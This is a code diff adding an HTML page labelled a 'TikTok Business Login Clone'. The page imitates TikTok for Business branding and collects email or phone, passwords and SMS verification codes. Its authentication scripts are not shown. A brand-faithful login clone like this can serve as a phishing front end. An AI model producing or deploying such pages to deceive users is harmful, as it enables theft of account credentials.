@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>TikTok Business Login Clone</title>
+
+<link rel="stylesheet" href="style.css"/>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<script src="https://accounts.google.com/gsi/client" async defer></script>
+</head>
+
+<body>
+
+<header class="site-header">
+    <a href="#" class="brand-mark">
+        <img src="./assets/tiktok-logo-black.png" alt="TikTok for Business" class="header-logo" width="4690" height="648">
+    </a>
+    <button type="button" class="lang-select" aria-haspopup="listbox" aria-expanded="false">
+        English
+        <svg class="lang-chevron" width="12" height="12" viewBox="0 0 12 12" aria-hidden="true"><path fill="currentColor" d="M6 8L1 3h10z"/></svg>
+    </button>
+</header>
+
+<main class="main-wrap">
+<div class="container">
+
+    <!-- Left -->
+    <div class="left">
+
+        <!-- ═══════════════ LOGIN VIEW ═══════════════ -->
+        <div id="loginView">
+
+            <h1>
+                <span class="pink">Log in</span> to your TikTok for Business account
+            </h1>
+
+            <p class="desc">
+                Enter here to access TikTok Ads Manager, Business Center and TikTok One.
+            </p>
+
+            <p class="signup">
+                Don't have an account yet?
+                <a href="#">Sign up now</a>
+            </p>
+
+            <p id="authStatusBanner" class="auth-status-banner" role="alert" hidden></p>
+
+            <form class="login-form" id="loginForm">
+
+                <!-- Email field (default) -->
+                <div id="emailBlock">
+                    <div class="label-row">
+                        <label for="email">Email</label>
+                        <a href="#" class="label-action" id="toggleInputMode">Use phone</a>
+                    </div>
+                    <input id="email" type="email" placeholder="Enter your email address" autocomplete="email">
+                </div>
+
+                <!-- Phone field (hidden by default) -->
+                <div id="phoneBlock" style="display:none">
+                    <div class="label-row">
+                        <label for="phone">Phone number</label>
+                        <a href="#" class="label-action" id="toggleInputModePhone">Use email</a>
+                    </div>
+                    <div class="phone-field">
+                        <select class="country-code" id="countryCode" aria-label="Country code">
+                            <option value="+1">🇺🇸 +1</option>
+                            <option value="+44">🇬🇧 +44</option>
+                            <option value="+91">🇮🇳 +91</option>
+                            <option value="+31">🇳🇱 +31</option>
+                            <option value="+49">🇩🇪 +49</option>
+                            <option value="+33">🇫🇷 +33</option>
+                            <option value="+81">🇯🇵 +81</option>
+                            <option value="+86">🇨🇳 +86</option>
+                            <option value="+55">🇧🇷 +55</option>
+                            <option value="+7">🇷🇺 +7</option>
+                        </select>
+                        <input id="phone" type="tel" placeholder="Please enter your phone number" autocomplete="tel">
+                    </div>
+                </div>
+
+                <!-- Password field (default) -->
+                <div id="passwordBlock">
+                    <div class="label-row">
+                        <label for="password">Password</label>
+                        <a class="label-action" href="#" id="forgotPasswordLink">Forgot password</a>
+                    </div>
+                    <div class="password-field">
+                        <input id="password" type="password" placeholder="Enter your password" autocomplete="current-password">
+                        <button type="button" class="toggle-pwd" id="togglePwd" aria-label="Show password" aria-pressed="false">
+                            <svg class="eye-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
+                                <circle cx="12" cy="12" r="3"/>
+                            </svg>
+                        </button>
+                    </div>
+                    <a href="#" class="sms-toggle-link" id="smsToggleLink">Log in with SMS Code</a>
+                </div>
+
+                <!-- SMS code field (hidden by default) -->
+                <div id="smsBlock" style="display:none">
+                    <div class="label-row">
+                        <label for="smsCode">Verification code</label>
+                    </div>
+                    <div class="sms-field">
+                        <input id="smsCode" type="text" placeholder="Enter verification code" autocomplete="one-time-code" inputmode="numeric">
+                        <button type="button" class="send-code-btn" id="sendCodeBtn">Send code</button>
+                    </div>
+                    <a href="#" class="sms-toggle-link" id="pwdToggleLink">Log in with Password</a>
+                </div>
+
+                <button type="submit" class="login-btn">Log in</button>
+
+            </form>
+
+            <div class="divider">
+                <span>Or</span>
+            </div>
+
+            <div class="social-btns">
+            <button type="button" class="tiktok-btn">
+                <img src="./assets/tiktok-logo-black.png" alt="" class="tiktok-btn-logo" width="4690" height="648">
+                Log in with TikTok
+            </button>
+
+            <button type="button" class="google-btn" id="googleSignInBtn">
+                <svg class="google-btn-icon" width="18" height="18" viewBox="0 0 48 48" aria-hidden="true">
+                    <path fill="#FFC107" d="M43.611 20.083H42V20H24v8h11.303C33.827 32.657 29.257 36 24 36c-6.627 0-12-5.373-12-12s5.373-12 12-12c3.059 0 5.842 1.154 7.961 3l5.657-5.657C33.529 5.322 29.011 3 24 3 12.955 3 4 11.955 4 23s8.955 20 20 20 20-8.955 20-20c0-1.341-.138-2.65-.389-3.917z"/>
+                    <path fill="#FF3D00" d="M6.306 14.691l6.571 4.819C14.655 15.108 18.961 12 24 12c3.059 0 5.842 1.154 7.961 3l5.657-5.657C33.529 5.322 29.011 3 24 3 16.318 3 9.656 7.337 6.306 14.691z"/>
+                    <path fill="#4CAF50" d="M24 43c5.305 0 10.204-2.002 13.903-5.291l-6.452-5.443C29.177 34.856 26.735 36 24 36c-5.231 0-9.639-3.346-11.284-8.028l-6.522 5.025C9.551 39.556 16.227 43 24 43z"/>
+                    <path fill="#1976D2" d="M43.611 20.083H42V20H24v8h11.303c-.793 2.436-2.242 4.528-4.084 5.906l.001-.001 6.452 5.443C38.509 36.683 44 31 44 24c0-1.341-.138-2.65-.389-3.917z"/>
+                </svg>
+                Sign in with Google
+            </button>
+            </div>
+
+            <p class="help">
+                <a href="#">Having problems logging in with TikTok?</a>
+            </p>
+
+        </div><!-- /#loginView -->
+
+
+        <!-- ═══════════════ FORGOT PASSWORD VIEW ═══════════════ -->
+        <div id="forgotView" style="display:none">
+
+            <button type="button" class="back-btn" id="backToLogin">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="15 18 9 12 15 6"/></svg>
+                Back
+            </button>
+
+            <h1 class="forgot-title">Forgot password</h1>
+
+            <form class="login-form" id="forgotForm">
+
+                <!-- Email field (default) -->
+                <div id="fpEmailBlock">
+                    <div class="label-row">
+                        <label for="fpEmail">Email</label>
+                        <a href="#" class="label-action" id="fpToggleInputMode">Use phone</a>
+                    </div>
+                    <input id="fpEmail" type="email" placeholder="Enter your email address" autocomplete="email">
+                </div>
+
+                <!-- Phone field (hidden by default) -->
+                <div id="fpPhoneBlock" style="display:none">
+                    <div class="label-row">
+                        <label for="fpPhone">Phone number</label>
+                        <a href="#" class="label-action" id="fpToggleInputModePhone">Use email</a>
+                    </div>
+                    <div class="phone-field">
+                        <select class="country-code" id="fpCountryCode" aria-label="Country code">
+                            <option value="+1">🇺🇸 +1</option>
+                            <option value="+44">🇬🇧 +44</option>
+                            <option value="+91">🇮🇳 +91</option>
+                            <option value="+31">🇳🇱 +31</option>
+                            <option value="+49">🇩🇪 +49</option>
+                            <option value="+33">🇫🇷 +33</option>
+                            <option value="+81">🇯🇵 +81</option>
+                            <option value="+86">🇨🇳 +86</option>
+                            <option value="+55">🇧🇷 +55</option>
+                            <option value="+7">🇷🇺 +7</option>
+                        </select>
+                        <input id="fpPhone" type="tel" placeholder="Please enter your phone number" autocomplete="tel">
+                    </div>
+                </div>
+
+                <!-- Verification code -->
+                <div class="label-row">
+                    <label for="fpCode">Verification code</label>
+                </div>
+                <div class="sms-field" style="margin-bottom:20px">
+                    <input id="fpCode" type="text" placeholder="Enter verification code" autocomplete="one-time-code" inputmode="numeric">
+                    <button type="button" class="send-code-btn" id="fpSendCodeBtn">Send code</button>
+                </div>
+
+                <!-- New password -->
+                <div class="label-row">
+                    <label for="fpNewPwd">Password</label>
+                </div>
+                <div class="password-field">
+                    <input id="fpNewPwd" type="password" placeholder="Enter your password" autocomplete="new-password">
+                    <button type="button" class="toggle-pwd" id="fpToggleNewPwd" aria-label="Show password" aria-pressed="false">
+                        <svg class="eye-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+                            <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
+                            <circle cx="12" cy="12" r="3"/>
+                        </svg>
+                    </button>
+                </div>
+
+                <!-- Confirm password -->
+                <div class="label-row">
+                    <label for="fpConfirmPwd">Confirm Password</label>
+                </div>
+                <div class="password-field">
+                    <input id="fpConfirmPwd" type="password" placeholder="Enter your password" autocomplete="new-password">
+                    <button type="button" class="toggle-pwd" id="fpToggleConfirmPwd" aria-label="Show password" aria-pressed="false">
+                        <svg class="eye-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+                            <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
+                            <circle cx="12" cy="12" r="3"/>
+                        </svg>
+                    </button>
+                </div>
+
+                <button type="submit" class="login-btn">Reset Password</button>
+
+            </form>
+
+        </div><!-- /#forgotView -->
+
+    </div>
+
+
+    <!-- Right -->
+    <div class="right">
+        <div class="hero-wrap">
+            <img src="./assets/mainback.png" class="hero" alt="">
+
+        </div>
+    </div>
+
+</div>
+</main>
+
+<footer class="site-footer">
+    <p class="footer-inner">
+        <span class="footer-copy">©2026 TikTok for Business</span>
+        <span class="footer-sep">|</span>
+        <a href="#">Help</a>
+        <span class="footer-sep">|</span>
+        <a href="#">Terms &amp; Policies</a>
+        <span class="footer-sep">|</span>
+        <a href="#">TikTok for Business</a>
+    </p>
+</footer>
+
+<div id="authGateOverlay" class="auth-gate-overlay" hidden aria-hidden="true">
+    <div class="auth-gate-loader" aria-busy="true" aria-label="Loading"></div>
+</div>
+
+<script src="config.js"></script>
+<script src="js/auth-api.js"></script>
+<script src="js/auth-ui.js"></script>
+<script src="main.js"></script>
+
+</body>
+</html>
